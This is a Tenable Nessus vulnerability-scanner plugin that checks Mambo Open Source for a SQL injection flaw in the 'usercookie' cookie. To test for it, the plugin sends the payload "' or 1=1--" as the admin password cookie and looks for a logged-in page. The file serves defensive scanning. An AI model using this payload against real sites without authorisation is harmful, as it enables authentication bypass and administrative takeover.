#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22509);
  script_version("$Revision: 1.15 $");

  script_bugtraq_id(20366);
  script_osvdb_id(50002);

  script_name(english:"Mambo Open Source usercookie Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication in Mambo Open Source");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote installation of Mambo Open Source fails to sanitize input
to the 'usercookie' cookie array before using it in a database query
to authenticate a user.  Provided PHP's 'magic_quotes_gpc' setting is
disabled, an attacker may be able to exploit this issue to manipulate
database queries and, for example, bypass authentication and gain
administrative access to the affected application." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00116-10042006" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/10/06");
 script_cvs_date("$Date: 2016/05/16 14:02:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("mambo_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/mambo_mos");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  set_http_cookie(name: "usercookie[username]", value: "admin");
  set_http_cookie(name: "usercookie[password]", value: urlencode(str:"' or 1=1--"));
  # Try to exploit the flaw to bypass authentication.
  r = http_send_recv3(method: "GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if we are now authenticated.
  if (
    '<form action="index.php?option=logout"' >< r[2] && 
    "Hi, " >< r[2]
  ) {
   security_warning(port);
   set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  }
}
